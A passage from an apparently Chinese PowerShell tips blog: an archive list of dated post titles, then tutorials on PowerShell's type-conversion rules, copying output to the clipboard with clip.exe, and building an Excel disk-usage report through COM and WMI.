部分） 2020-06-11 自学习参数完成 2020-06-15 转换十六进制数据 2020-06-17 局域网唤醒 2020-06-19 使用断言 2020-06-23 移除空白的属性 2020-06-25 在网格视图窗口中将对象数据显示为表格 2020-06-29 改变操作系统描述 2020 年 07 月 2020-07-01 操作系统的启动和安装时间 2020-07-03 识别 Windows 类型 2020-07-07 识别操作系统详细信息 2020-07-09 忽略（任何）输出 2020-07-13 丢弃数据流 2020-07-15 禁止 Write-Host 语句输出 2020-07-17 重定向流 2020-07-21 显示 Wi-Fi 配置 2020-07-23 导出 Wi-Fi 密码 2020-07-27 显示 Wi-Fi 的 SSID 2020-07-29 添加 Azure 的 PowerShell 命令 2020-07-31 添加 SharePoint 的 PowerShell 命令 2020 年 08 月 2020-08-04 详细的电池报告 2020-08-06 读取 4K 哈希 2020-08-10 验证用户账户密码（第 1 部分） 2020-08-12 验证用户账户密码（第 2 部分） 2020-08-14 验证用户账户密码（第 3 部分） 2020-08-18 动态创建 PowerShell 函数 2020-08-20 加速 PowerShell 远程操作 2020-08-24 下载有用的脚本 2020-08-26 管理自启动项 2020-08-28 删除多个子文件夹 2020 年 09 月 2020-09-01 删除 Microsoft Teams 缓存数据 2020-09-03 检测已安装的防病毒产品 2020-09-07 检测防病毒引擎状态 2020-09-09 启用或禁用实时防病毒保护 2020-09-11 使用 $Is* 变量 2020-09-15 在 PowerShell ISE 中使用 PowerShell 7 2020-09-17 设置和清除信任的主机 2020-09-21 摆脱 Get-EventLog 2020-09-23 识别用户 Profile 2020-09-25 使用 Profile 脚本 2020-09-29 PowerShell技能连载-检查配置文件脚本（第 1 部分） 2020 年 10 月 2020-10-01 PowerShell技能连载-检查配置文件脚本（第 2 部分） 2020-10-05 在没有管理员特权的情况下更新帮助 2020-10-07 使用在线帮助（第 1 部分） 2020-10-09 使用在线帮助（第 2 部分） 2020-10-13 识别 PowerShell 宿主和路径 2020-10-15 将文件路径转为 8.3 格式（第 1 部分） 2020-10-19 将文件路径转为 8.3 格式（第 2 部分） 2020-10-21 测试应用程序是否存在 2020-10-23 试用新的 SSH 远程操作 2020-10-27 以可点击图标的方式部署 PowerShell（第 1 部分） 2020-10-29 以可点击图标的方式部署 PowerShell（第 2 部分） 2020 年 11 月 2020-11-02 彻底删除 AD 对象 2020-11-04 为任何用户启动 Windows 终端 2020-11-06 将 Windows Terminal 变成便携式应用程序 2020-11-10 调优 Windows Terminal 2020-11-12 创建图标 2020-11-16 修复 PowerShell Gallery 的访问 2020-11-18 管理已安装的模块（第 1 部分） 2020-11-20 管理已安装的模块（第 2 部分） 2020-11-24 查找 PowerShell 宿主参数和可执行文件 2020-11-26 禁止错误提示 2020-11-30 恒定函数 2020 年 12 月 2020-12-02 读取上次登录的用户和其他注册表值 2020-12-04 读取事件日志（第 1 部分） 2020-12-08 读取事件日志（第 2 部分） 2020-12-10 读取事件日志（第 3 部分） 2020-12-14 读取事件日志（第 4 部分） 2020-12-16 保持 Windows 和 PowerShell 持续运行 2020-12-18 读取已安装的软件（第 1 部分） 2020-12-22 读取已安装的软件（第 2 部分） 2020-12-24 标识本地管理员帐户的名称 2020-12-28 管理本地组成员（第 1 部分） 2020-12-30 管理本地组成员（第 2 部分） 2021 年2021 年 01 月 2021-01-01 更好的递归 2021-01-05 了解 PowerShell 中的 REST Web 服务 2021-01-07 查找未使用（或使用过的）驱动器号 2021-01-11 获取开机以来经历的时间 2021-01-13 更好的 NetStat（第 1 部分） 2021-01-15 更好的 NetStat（第 2 部分） 2021-01-19 更好的 NetStat（第 3 部分） 2021-01-21 更好的 NetStat（第 4 部分） 2021-01-25 检测未知的网络监听器 2021-01-27 识别位置和公共 IP 2021-01-29 识别当前时区 2021 年 02 月 2021-02-02 使用 GitHub Web Service（第 1 部分） 2021-02-04 使用 GitHub Web Service（第 2 部分） 2021-02-08 将文本翻译成莫尔斯电码 2021-02-10 在 Windows 上安装 PowerShell 7 的最简单方法 2021-02-12 探索 Windows 上的程序包管理器（第 1 部分） 2021-02-16 探索 Windows 上的程序包管理器（第 2 部分） 2021-02-18 跨平台的 Out-GridView 2021-02-22 修复 Install-Module (PowerShellGet) 2021-02-24 查找 PowerShell 命令 2021-02-26 修复 VSCode PowerShell 问题（第 1 部分） 2021 年 03 月 2021-03-02 修复 VSCode PowerShell 问题（第 2 部分） 2021-03-04 使用编码标准 2021-03-08 转换 Word 文档 2021-03-10 信任自签名的 HTTPS 证书 2021-03-12 保存文本文件时去掉 BOM 2021-03-16 探索文件夹结构（第 1 部分） 2021-03-18 探索文件夹结构（第 2 部分） 2021-03-22 识别网络访问的来源 2021-03-24 研究 PowerShell 控制台输出 2021-03-26 使用 BITS 来下载文件（第 1 部分） 2021-03-30 使用 BITS 来下载文件（第 2 部分） 2021 年 04 月 2021-04-01 查找上次登录的用户 2021-04-05 观看德国电视节目 2021-04-07 使用 NTFS 流（第 1 部分） 2021-04-09 使用 NTFS 流（第 2 部分） 2021-04-13 使用 NTFS 流（第 3 部分） 2021-04-15 使用 NTFS 流（第 4 部分） 2021-04-19 使用 NTFS 流（第 5 部分） 2021-04-21 查找系统路径 2021-04-23 识别组成员身份 2021-04-27 快速初始化多个PowerShell控制台 2021-04-29 Linux 如何保护安全字符串（实际未保护） 2021 年 05 月 2021-05-03 检测 Wi-Fi 信号强度（第 1 部分） 2021-05-05 检测 Wi-Fi 信号强度（第 2 部分） 2021-05-07 检测 Wi-Fi 信号强度（第 3 部分） 2021-05-11 更好的 PowerShell 帮助（第 1 部分） 2021-05-13 更好的 PowerShell 帮助（第 2 部分） 2021-05-17 更好的 PowerShell 帮助（第 3 部分） 2021-05-19 导出不带引号的CSV（和其他转换技巧） 2021-05-21 修复 CSV 导出（第 1 部分） 2021-05-25 修复 CSV 导出（第 2 部分） 2021-05-27 解析原始数据和日志文件（第 1 部分） 2021-05-31 解析原始数据和日志文件（第 2 部分） 2021 年 06 月 2021-06-02 评估事件日志数据（第 1 部分） 2021-06-04 评估事件日志数据（第 2 部分） 2021-06-08 评估事件日志数据（第 3 部分） 2021-06-10 原版 Windows 10 产品密钥 2021-06-14 检测 Windows 版本（第 1 部分） 2021-06-16 检测 Windows 版本（第 2 部分） 2021-06-18 检测 Windows 版本（第 3 部分） 2021-06-22 对文本做哈希 2021-06-24 排序技巧（第 1 部分） 2021-06-28 排序技巧（第 2 部分） 2021-06-30 排序技巧（第 3 部分） 2021 年 07 月 2021-07-02 排序技巧（第 4 部分） 2021-07-06 拆分而不丢失字符 2021-07-08 生日派对的琐事 2021-07-12 取证事件日志分析（第 1 部分） 2021-07-14 取证事件日志分析（第 2 部分） 2021-07-16 启用 ActiveDirectory 模块 2021-07-20 在 Windows 10 中解锁额外的 PowerShell 模块 2021-07-22 管理快捷方式文件（第 1 部分） 2021-07-26 管理快捷方式文件（第 2 部分） 2021-07-28 管理快捷方式文件（第 3 部分） 2021-07-30 在 Windows 10 上启用 Telnet 2021 年 08 月 2021-08-03 读取打印机属性（第 1 部分） 2021-08-05 读取打印机属性（第 2 部分） 2021-08-09 读取打印机属性（第 3 部分） 2021-08-11 列出网络驱动器 2021-08-13 移除网络驱动器 2021-08-17 处理控制台命令的错误 2021-08-19 显示警告对话框（第 1 部分） 2021-08-23 显示警告对话框（第 2 部分） 2021-08-25 发现公共 IP 地址 2021-08-27 使用 FTP：列出文件夹（第 1 部分） 2021-08-31 使用 FTP：下载文件（第 2 部分） 2021 年 09 月 2021-09-02 使用 FTP：下载二进制文件（第 3 部分） 2021-09-06 使用 FTP：上传文件（第 4 部分） 2021-09-08 从网站读取 HTTP 消息头 2021-09-10 Creating Dummy Test Files 2021-09-14 简单的内置密码生成器 2021-09-16 识别连上的 Domain 2021-09-20 识别本地管理员帐户 2021-09-22 识别本地管理员组 2021-09-24 重命名本地管理员账户 2021-09-28 禁用本地的 Guest 账户 2021-09-30 截屏 2021 年 10 月 2021-10-04 分割文本行（第 1 部分） 2021-10-06 分割文本行（第 2 部分） 2021-10-08 分割文本行（第 3 部分） 2021-10-12 创建动态参数 2021-10-14 将 UNIX 时间转为 DateTime 2021-10-18 将 Ticks 转换为 DateTime 2021-10-20 调整脚本性能 2021-10-22 Working with Get-WinEvent 2021-10-26 读取文本文件（快速） 2021-10-28 速度很重要 2021 年 11 月 2021-11-01 高级排序（第 1 部分） 2021-11-03 高级排序（第 2 部分） 2021-11-05 高级排序（第 3 部分） 2021-11-09 高级排序（第 4 部分） 2021-11-11 打开 Windows 设置对话框（快速）（第 1 部分） 2021-11-15 打开 Windows 设置对话框（快速）（第 2 部分） 2021-11-17 改进 PowerShell ISE 的帮助 2021-11-19 四个 PowerShell 关键先决条件 2021-11-23 启用 Active Directory cmdlet 2021-11-25 通过 PowerShell 调用 COVID 服务 2021-11-29 使用 SOAP Webservice 2021 年 12 月 2021-12-01 禁用摄像头 2021-12-03 检测挂起的重启 2021-12-07 修复 PowerShellGet 和 Publish-Module 2021-12-27 Out-GridView 自定义列 2021-12-29 自动化下载联想驱动程序（第 1 部分） 2021-12-31 自动化下载联想驱动程序（第 2 部分） 2022 年2022 年 01 月 2022-01-04 Windows 重启后自动登录 2022-01-06 动态生成 IntelliSense. 2022-01-10 转义 URL 字符串 2022-01-12 安全地转义数据字符串 2022-01-14 转义独立的字符 2022-01-18 决定您的平台 2022-01-20 是否在 Windows PowerShell 中运行（第 1 部分） 2022-01-24 是否在 Windows PowerShell 中运行（第 2 部分） 2022-01-26 测试 URL 是否完整 2022-01-28 识别主 PowerShell 模块位置 2022 年 02 月 2022-02-01 查看所有模块的细节 2022-02-03 打开关闭 Windows 的对话框 2022-02-07 通过 PowerShell 创建日历电子表格 2022-02-09 计算第几周（第 1 部分） 2022-02-11 计算第几周（第 2 部分） 2022-02-15 本地化日期和时间标签（第 1 部分） 2022-02-17 本地化日期和时间标签（第 2 部分） 2022-02-21 奇怪的 Cmdlet：New-TemporaryFile 2022-02-23 检测计划外的关机 2022-02-25 检测电源状态 2022 年 03 月 2022-03-01 通过 PowerShell 休眠或待机 2022-03-03 自定义基于控制台的对话框 2022-03-07 在 Windows 中用 PowerShell 来管理文件共享（第 1 部分） 2022-03-09 在 Windows 中用 PowerShell 来管理文件共享（第 2 部分） 2022-03-11 为文件夹快速打开 PowerShell 2022-03-15 管理 Bitlocker 2022-03-17 复位防火墙策略 2022-03-21 Defender: 清空威胁列表和相关设置 2022-03-23 从 Internet 下载文件 2022-03-25 在 PowerShell 使用高效的列表 2022-03-29 Update PowerShell’s PSReadLine 2022-03-31 Using Dynamic Help in PowerShell Console 2022 年 04 月 2022-04-04 Using Predictive IntelliSense 2022-04-06 Automating User Confirmation 2022-04-08 管理 Wi-Fi 配置文件 2022-04-12 More Control with Strict Mode 2022-04-14 利用 WMI（第 1 部分） 2022-04-18 利用 WMI（第 2 部分） 2022-04-20 利用 WMI（第 3 部分） 2022-04-22 利用 WMI（第 4 部分） 2022-04-26 利用 WMI（第 5 部分） 2022-04-28 2022 年的 PowerShell 计划 2022 年 05 月 2022-05-02 管理蓝牙设备（第 1 部分） 2022-05-04 管理蓝牙设备（第 2 部分） 2022-05-06 管理蓝牙设备（第 2 部分） 2022-05-10 清理硬盘（第 1 部分） 2022-05-12 清理硬盘（第 2 部分） 2022-05-16 专业地处理错误 2022-05-18 签名 PowerShell 脚本（第 1 部分） 2022-05-20 签名 PowerShell 脚本（第 2 部分） 2022-05-24 签名 PowerShell 脚本（第 3 部分） 2022-05-26 为 PowerShell 创建 sudo（第 1 部分） 2022-05-30 为 PowerShell 创建 sudo（第 2 部分） 2022 年 06 月 2022-06-01 读取 Windows 10 产品序列号 2022-06-03 简单的类似 grep 的文本过滤器（第 1 部分） 2022-06-07 解析 URL 2022-06-09 值得一读：PowerShell 语言规范 2022-06-13 检测多语言在线文档（第 1 部分） 2022-06-15 检测多语言在线文档（第 2 部分） 2022-06-17 请注意数组 2022-06-21 PowerShell 扩展的重要更新 2022-06-23 解锁多个文件 2022-06-27 快速查找过期的 PowerShell 模块 2022-06-29 清理 PowerShell 模块（第 1 部分） 2022 年 07 月 2022-07-01 清理 PowerShell 模块（第 2 部分） 2022-07-05 清理 PowerShell 模块（第 3 部分） 2022-07-07 下载文件 2022-07-11 恢复被浪费的硬盘空间 2022-07-13 在 PowerShell 中粘贴多行 2022-07-15 在选中的代码中运行 $PSScriptRoot 2022-07-19 创建世界地图图像 2022-07-21 确定语言包（第 1 部分） 2022-07-25 确定语言包（第 2 部分） 2022-07-27 确定语言包（第 3 部分） 2022-07-29 将语言 ID 转为语言名称 2022 年 08 月 2022-08-02 记录变量类型 2022 年 09 月 2022-09-27 请担心 -match 运算符 2022-09-29 利用用户配置文件的优势 2022 年 10 月 2022-10-03 更新帮助 2022-10-05 使用 HTML 来创建 PDF 报告（第 1 部分） 2022-10-07 使用 HTML 来创建 PDF 报告（第 2 部分） 2022-10-11 使用 HTML 来创建 PDF 报告（第 3 部分） 2022-10-13 存取 Windows 凭据管理器 2022-10-17 查找 MSI 产品代码（第 1 部分） 2022-10-19 查找 MSI 产品代码（第 2 部分） 2022-10-21 遮罩输入框（第 1 部分） 2022-10-25 遮罩输入框（第 2 部分） 2022-10-27 获取卷 ID（第 1 部分） 2022-10-31 获取卷 ID（第 2 部分） 2022 年 11 月 2022-11-02 创建新的代码签名测试证书 2022-11-04 无人值守读取 PFX 证书 2022-11-08 获取系统正常运行时间 2022-11-10 当格式化失败时 2022-11-29 小心使用数组 2022-11-29 Determining Language Packs (Part 3) 2022-11-29 检测多语言在线文档（第 2 部分） 2023 年2023 年 01 月 2023-01-03 Showing Progress in Taskbar Buttons 2023-01-05 在任务栏按钮中显示不确定的进度 2023-01-09 在任务栏按钮显示错误状态 2023-01-11 在任务栏按钮显示警告状态 2023-01-13 管理文件共享 2023-01-17 Custom Action for Unknown Commands 2023-01-19 订阅锁定和解锁事件 2023-01-23 通过 SNMP 查询高级的打印机 2023-01-25 研究 PowerShell 命令结果 2023-01-27 导出 Edge 的 Cookie 2023-01-31 将 PowerShell 脚本作为命令（第 1 部分） 2023-01-31 将 PowerShell 脚本作为命令（第 2 部分） 2023 年 02 月 2023-02-06 使用枚举来解析序号 2023-02-08 检测电池健康与质量 2023-02-09 选择最佳方法：单词转大写（第 1 部分） 2023-02-10 选择最佳方法：单词转大写（第 1 部分） 2023-02-12 选择最佳方法：单词转大写（第 3 部分） 2023-02-14 选择最佳方法：单词转大写（第 2 部分） 2023-02-16 Picking Best Approach: Example Capitalizing Words (Part 3) 2023-02-20 Picking Best Approach Example Capitalizing Words (Part 4) 2023-02-22 研究 ConfirmImpact（第 1 部分：用户视角） 2023-02-24 研究 ConfirmImpact（第 2 部分：脚本作者视角） 2023-02-28 使用合适的数据类型（第 1 部分） 2023 年 03 月 2023-03-02 使用合适的数据类型（第 2 部分） 2023-03-06 自动化操作 Defender 杀毒软件（第 1 部分） 2023-03-06 存储任何加密的文本 2023-03-08 将波长转换为 RGB 2023-03-10 自动化操作 Defender 杀毒软件（第 1 部分） 2023-03-14 自动化操作 Defender 杀毒软件（第 2 部分） 2023-03-16 翻译数据 2023 年 04 月 2023-04-11 使用 PowerShell 解决问题（第 4 部分） 2023-04-13 更丰富的打印机信息 2023-04-17 PowerShell 废弃功能 (第 1 部分：PowerShell 2.0) 2023-04-19 PowerShell 废弃功能（第 2 部分：Exchange Online 中的远程 PowerShell (RPS)） 2023-04-21 常见陷阱和奇怪结果：比较运算符 2023-04-25 重命名属性（简单方法） 2023-04-27 Office365邮箱恢复删除（第 1 部分） 2023 年 05 月 2023-05-01 列出所有域控制器 2023-05-01 永久删除硬盘内容 2023-05-01 Office365邮箱恢复删除（第 2 部分） 2023-05-03 彻底删除硬盘数据 2023-05-05 列出所有域控制器 2023-05-09 列出活动的域控制器 2023-05-11 进度条技巧（第 1 部分） 2023-05-13 进度条技巧（第 2 部分） 2023-05-17 进度条技巧（第 3 部分） 2023-05-19 进度条技巧（第 4 部分） 2023-05-23 创建 ISO 文件 2023-05-25 挂载 ISO 文件 2023-05-29 两种类型转换（和一个 bug） 2023-05-31 Invoke-RestMethod 退出错误 2023 年 06 月 2023-06-02 获取父级文化 2023-06-06 SpeculationControl：使用 PowerShell 检查风险 2023-06-08 测试驱动 PowerShellGet 版本 3 2023-06-15 7个用于管理DHCP的最佳PowerShell脚本 2023-06-29 选择最适当的文件格式（第 1 部分） 2023 年 07 月 2023-07-04 学习在Powershell中使用管道的3种有效方法 2023-07-05 选择最佳的文件格式（第 3 部分） 2023-07-07 选择最佳的文件格式（第 4 部分） 2023-07-11 PowerShell 脚本未经确认无法运行 2023-07-13 从 DateTime 中生成日期 2023-07-17 星座计算器（又称“Sternzeichen”） 2023-07-19 避免使用 Get-EventLog 2023-07-21 轻松过渡至 Get-WinEvent 2023-07-25 自动化控制面板 2023-07-27 带有掩码的输入 2023-07-31 管理文件共享 2023 年 08 月 2023-08-02 识别未正确加密的 AD 账户 2023-08-04 Microsoft Graph PowerShell 社区示例页面 2023-08-08 寻找开始时间退化 2023-08-10 10个每个人都应该知道的有用PowerShell命令 2023-08-10 获取德国节日 2023-08-14 Windows 系统的温度控制 2023-08-20 理解PowerShell中的错误处理 2023-08-24 获取法国假期 2023 年 09 月 2023-09-01 PowerShell函数的手把手指南 2023-09-09 PowerShell 过滤器：使用 Where-Object 和 Select-Object 2023 年 10 月 2023-10-21 理解 PowerShell 执行策略：初学者指南 2023 年 11 月 2023-11-01 轻松掌握PowerShell中的ErrorAction 2024 年2024 年 01 月 2024-01-11 PowerCLI：管理VMware的简便方法 2024 年 02 月 2024-02-15 使用 PowerShell 自动化 Windows 11 任务：实用指南 2024-02-28 针对Windows服务器的4种强大的PowerShell安全技术 2024 年 03 月 2024-03-05 25个最佳的Powershell脚本仓库 2024-03-05 7 个用于管理 DHCP 的最佳 PowerShell 脚本 2024-03-20 管理 DNS 的 8 个最佳 Powershell 脚本 2024-03-23 15个最佳的Active Directory Powershell脚本 2024 年 08 月 2024-08-22 批量检测服务器端口","link":"/2013/09/09/index/"},{"title":"理解PowerShell的类型转换魔法","text":"毫无疑问地，PowerShell中的类型转换是它最有用的“魔法”功能之一。如果您执行一个需要特定参数类型（例如：DateTime 或 TimeSpan）的命令，情况似乎“一切正常”。 例如，Twitter上的这条问题： PowerShell 的 TimeSpan 参数将10理解为10个计时周期，10:00理解为10小时，”10”理解为10天。 译者注：计时周期的概念请参见 TimeSpan.Ticks 属性。 但是，这是怎么做到的呢？ 以下是PowerShell根据您的需要将输入值转换为所需要的类型的步骤——例如 TimeSpan。和许多事情一样，并不是什么魔法——只是一堆繁琐的工作。 1. 直接赋值如果您的输入值是可直接赋值的，那么直接将您的输入值转型为该类型。 2. 基于语言的转换这些基于语言的转换适用于目标类型是 void、Boolean、String、Array、Hashtable、PSReference（例如：[ref]）、XmlDocument（例如：[xml]）、Delegate（用于支持代码块转换到Delegate） 和 Enum 类型。 3. 解析转换如果目标类型定义了一个 Parse() 方法接受该输入值，那么将使用它来做转换。 4. 静态创建转换如果目标类型定义了一个静态的 ::Create() 方法并接受该输入值，那么将使用它来转做换。 5. 构造函数转换如果目标类型定义了一个构造函数接受该输入值，那么将用它来做转换。 6. 强制类型转换如果目标类型针对源类型 隐式或显示地 定义了一个强制类型转换操作符，那么将用它来做转换。如果源类型定义了一个隐式或显式转换到目标类型的前置类型转换操作符，那么使用它来做转换。 7. IConvertible转换如果源类型定义了一个知道如何转换为目标类型的 IConvertible 的实现，那么将使用它来做转换。 8. IDictionary转换如果源类型是一个 IDictionary（例如：Hashtable） 类型，则尝试用目标类型的缺省构造函数创建一个实例，并且使用 IDictionary 中的同名键值对为源对象的属性赋值。 9. PSObject属性转换如果源类型是 PSObject，那么用目标类型的缺省构造函数创建一个实例，然后用 PSObject 中的属性名和属性值为源对象赋值。如果某个名字对应的是一个方法而不是一个属性，则以该值作为实参执行该方法。 10. TypeConverter 转换如果注册了一个可以处理该转换的 TypeConverter 或 PSTypeConverter，则用它来做转换。您可以在 types.ps1xml 文件中注册一个 TypeConverter（参见：$pshome\\Types.ps1xml），或通过 Update-TypeData 来注册。 好了，现在考考您能不能指出这些分别是什么类型的转换，以及为什么？ [TimeSpan] 10 [TimeSpan] &quot;10&quot; [TimeSpan] &quot;0:10&quot; 希望本文对您有所帮助！ Lee Holmes [MSFT]Windows PowerShell开发团队","link":"/2013/09/17/understanding-powershells-type-conversion-magic/"},{"title":"PowerShell 技能连载 - 将结果复制到剪贴板","text":"要将 CmdLet 的输出结果复制到别的应用程序，只需要简单地将它们通过管道传输到 clip.exe。然后，将结果粘贴到您所要的应用程序即可： Get-Service | clip 译者注 - CLIP 命令的帮助信息： C:\\&gt;clip /? CLIP 描述: 将命令行工具的输出重定向到 Windows 剪贴板。这个文本输出可以被粘贴 到其他程序中。 参数列表: /? 显示此帮助消息。 示例: DIR | CLIP 将一份当前目录列表的副本放入 Windows 剪贴板。 CLIP &lt; README.TXT 将 readme.txt 的一份文本放入 Windows 剪贴板。","link":"/2013/09/18/copying-results-to-clipboard/"},{"title":"在PowerShell中操作Excel - 创建一个简单的报表","text":"除了文本文件之外，Windows系统管理员最常用的工具是Microsoft Excel。我观察论坛中人们的讨论发现，有一大堆关于Excel电子表格讨论。许多人想要读写Excel的方法。通常，我告诉人们如果他们使用PowerShell，那么可以简单地将结果导出到CSV文件，然后用Excel打开，但是您很有可能需要一个真正的Excel文件。 我着手准备写几个关于如何在PowerShell中操作Excel的专题。今天我们将要通过Microsoft Excel和Windows PowerShell创建一个简单的报表。在第二部分中，我将演示如何创建一个更复杂的Excel文档。然后在第三部分中，我将向您演示如何从Excel文件中读取数据。 创建一个简单的报表Microsoft Excel包含一个非常复杂的COM对象模型，我们可以在Windows Powershell中和它交互。让我们从头开始创建一个Excel应用程序的对象。 PS C:\\&gt; $xl=New-Object -ComObject &quot;Excel.Application&quot; 执行完这一步以后，Excel已经开始在后台运行，虽然看不见可交互窗口。 PS C:\\&gt; get-process excel Handles NPM(K) PM(K) WS(K) VM(M) CPU(s) Id ProcessName ------- ------ ----- ----- ----- ------ -- ----------- 203 23 16392 24340 267 0.28 1280 EXCEL 下一步，我们将要创建一个工作簿对象。 PS C:\\&gt; $wb=$xl.Workbooks.Add() 下一步，我们将要创建一个工作表对象。 PS C:\\&gt; $ws=$wb.ActiveSheet 您可以将任何一个对象通过管道输出到 Get-Member 来学习它们。下一步，我们将使这个应用程序可见。 PS C:\\&gt; $xl.Visible=$True 当您开始写脚本的时候，您可以不必做这步。但是这步能帮您检验我们写的PowerShell命令的执行结果。有很多种办法能将信息输入到电子表格中。做为一个简单的任务，我将演示如何使用单元格（cell）对象。 PS C:\\&gt; $cells=$ws.Cells 我们可以用行和列坐标来获取每一个单元格对象。 PS C:\\&gt; $cells.item(1,1) 如果您试这行代码，您将获取到很多信息。我们将继续往下并且输入一些信息到这个单元格。 PS C:\\&gt; $cells.item(1,1)=$env:computername 您的计算机名将会被填入 A1 单元格。让我们来填入更多的数据。 PS C:\\&gt; $cells.item(1,2)=$env:username PS C:\\&gt; $cells.item(2,1)=(get-Date) 这个过程真的很简单。您只需要不断地记下当前的位置即可。如果您需要基本的格式，您可以使用每个单元格的 Font 属性。 PS C:\\&gt; $cells.item(1,1).font.bold=$True PS C:\\&gt; $cells.item(1,2).font.bold=$True PS C:\\&gt; $cells.item(1,1).font.size=16 PS C:\\&gt; $cells.item(1,2).font.size=16 好了，现在我们可以用 WorkBook 对象的 SaveAs() 方法保存这个文件。 PS C:\\&gt; $wb.SaveAs(&quot;c:\\work\\test.xlsx&quot;) To fully exit, we’ll close the workbook and quit Excel.若要完全退出，我们需要关闭工作簿并且退出Excel。 PS C:\\&gt; $wb.Close() PS C:\\&gt; $xl.Quit() 如果您检查进程的话，您也许会发现Excel任然在运行，但它将会在5-10分钟之内退出，自少按我的经验是这样。以上是基本的要点，但在圆满完成之前，让我整理一个脚本，将这些材料整合在一起。 Param([string]$computer=$env:computername) #get disk data $disks=Get-WmiObject -Class Win32_LogicalDisk -ComputerName $computer -Filter &quot;DriveType=3&quot; $xl=New-Object -ComObject &quot;Excel.Application&quot; $wb=$xl.Workbooks.Add() $ws=$wb.ActiveSheet $cells=$ws.Cells $cells.item(1,1)=&quot;{0} Disk Drive Report&quot; -f $disks[0].SystemName $cells.item(1,1).font.bold=$True $cells.item(1,1).font.size=18 #define some variables to control navigation $row=3 $col=1 #insert column headings &quot;Drive&quot;,&quot;SizeGB&quot;,&quot;FreespaceGB&quot;,&quot;UsedGB&quot;,&quot;%Free&quot;,&quot;%Used&quot; | foreach { $cells.item($row,$col)=$_ $cells.item($row,$col).font.bold=$True $col++ } foreach ($drive in $disks) { $row++ $col=1 $cells.item($Row,$col)=$drive.DeviceID $col++ $cells.item($Row,$col)=$drive.Size/1GB $cells.item($Row,$col).NumberFormat=&quot;0&quot; $col++ $cells.item($Row,$col)=$drive.Freespace/1GB $cells.item($Row,$col).NumberFormat=&quot;0.00&quot; $col++ $cells.item($Row,$col)=($drive.Size - $drive.Freespace)/1GB $cells.item($Row,$col).NumberFormat=&quot;0.00&quot; $col++ $cells.item($Row,$col)=($drive.Freespace/$drive.size) $cells.item($Row,$col).NumberFormat=&quot;0.00%&quot; $col++ $cells.item($Row,$col)=($drive.Size - $drive.Freespace) / $drive.size $cells.item($Row,$col).NumberFormat=&quot;0.00%&quot; } $xl.Visible=$True $filepath=Read-Host &quot;Enter a path and filename to save the file&quot; if ($filepath) { $wb.SaveAs($filepath) } 这也许是您想在PowerShell里做的事情：用WMI获取磁盘使用信息并将其记录在Excel电子表格中。这段脚本以计算机名做为参数，缺省值为localhost。然后使用Get-WMIObject来获取磁盘信息。 脚本的第一部分看起来应该很熟悉，它创建一个Excel应用程序和对象。该脚本向A1单元格插入一个标题。 $cells.item(1,1)=&quot;{0} Disk Drive Report&quot; -f $disks[0].SystemName $cells.item(1,1).font.bold=$True $cells.item(1,1).font.size=18 脚本的主体部分从每个逻辑磁盘中提取数据，并且将一些属性写入Excel。由于我需要通过行和列来操作这些单元格对象，所以我将定义一些用来定位用的辅助变量。 $row=3 $col=1 通过它们，我可以插入我的表头。 &quot;Drive&quot;,&quot;SizeGB&quot;,&quot;FreespaceGB&quot;,&quot;UsedGB&quot;,&quot;%Free&quot;,&quot;%Used&quot; | foreach { $cells.item($row,$col)=$_ $cells.item($row,$col).font.bold=$True $col++ } 每循环一次，$col就增加1，所以达到向右“移动”的效果。现在我需要遍历disks集合。每次需要“向下”移动一行，并且从第一列开始。 foreach ($drive in $disks) { $row++ $col=1 $cells.item($Row,$col)=$drive.DeviceID $col++ $cells.item($Row,$col)=$drive.Size/1GB $cells.item($Row,$col).NumberFormat=&quot;0&quot; $col++ ... 接下来我将合适的WMI属性插入对应的单元格。每增加一行，我可以从左开始这个过程。请注意我使用了 NumberFormat 属性来格式化每个单元格的值。有一种探索的方法是创建一个Excel宏来记下所有您希望的步骤，然后查看生成的VBA代码。通过稍许的练习，您可以将这些命令翻译为PowerShell代码。 当脚本向电子表格写完数据以后，我把它显示出来并且提示用户输入文件名。如果用户输入的文件名，那么文件以该文件名保存。否则，您可以继续编辑电子表格，然后手动保存它。这个演示脚本并不会自动关闭Excel。这个脚本执行的结果如图1所示： 结论我知道还有很多问题，所以我将会把它们总结出来。在第二部分，我们将看到一些高级的格式化选项，以及其它使用Microsoft Excel的深入用法。如果您将要用PowerShell来创建Excel文档，您会尽可能做到极致。 用PowerShell操作Office系列文章 在PowerShell中操作Word - 生成文档 在PowerShell中操作Word - 使用格式化样式 在PowerShell中操作Excel - 创建一个简单的报表 在PowerShell中操作Excel - 创建一个富Excel文档 在PowerShell中操作Excel - 读取数据","link":"/2013/09/19/integrating-microsoft-excel-with-powershell-build-a-basic-report/"},{"title":"在PowerShell中操作Excel - 创建一个富Excel文档","text":"让我们继续《在PowerShell中操作Excel》系列文章。上一次我们掩饰了如何用Microsoft Excel和Windows PowerShell来创建一个基本的报表。从某些方面来讲，我们上次创建的东西和创建CSV并在Excel中打开差不了多少。所以，如果您希望用Excel，让我们彻彻底底地使用它！在今天的文章中，我将沿用上次的演示脚本，但是创建一个更“富（richer）”的Excel文档。下一步，在第三部分中，我将为您演示如何从Excel文件中读取数据。 创建一个富Excel文档和之前一样，我们将通过WMI获取磁盘信息，并创建一个Excel应用程序对象。 $disks=Get-WmiObject -Class Win32_LogicalDisk -ComputerName $computer -Filter &quot;DriveType=3&quot; $xl=New-Object -ComObject &quot;Excel.Application&quot; 和Microsoft Word类似，Excel自动化很大程度依赖于使用类似 xlDown 等内置常量。我可以记下一个常量值并创建一个变量，或者可以读取包含所需常量的合适的类。在我印象中，我将需要提取以下信息： $xlConditionValues=[Microsoft.Office.Interop.Excel.XLConditionValueTypes] $xlTheme=[Microsoft.Office.Interop.Excel.XLThemeColor] $xlChart=[Microsoft.Office.Interop.Excel.XLChartType] $xlIconSet=[Microsoft.Office.Interop.Excel.XLIconSet] $xlDirection=[Microsoft.Office.Interop.Excel.XLDirection] 将来当我希望使用 xlDown 时，我可以通过 $xlDirection::xlDown 来指定它。您等等会看到一些这样的代码。现在，我将像第一部分那样写入磁盘数据，但先让我们加入一些样式。另一种引用电子表格的一部分是使用工作簿对象的 Range 属性。您既可以通过类似的方式 A1 引用一个单元格，或者通过类似 A1:A10 的方式引用一个范围。范围（Range）对象有一个样式（Style）属性。我将把 A1 单元格的样式设置成“Title”，并且把我的表头样式设置成“Heading 2”。 $range=$ws.range(&quot;A1&quot;) $range.Style=&quot;Title&quot; #或者用这种方法 $ws.Range(&quot;A3:F3&quot;).Style = &quot;Heading 2&quot; 另一个常见的格式化选项是调整列宽。我们可以设置列宽为固定值或者为自动调整列宽。 $ws.columns.item(&quot;C:C&quot;).columnwidth=15 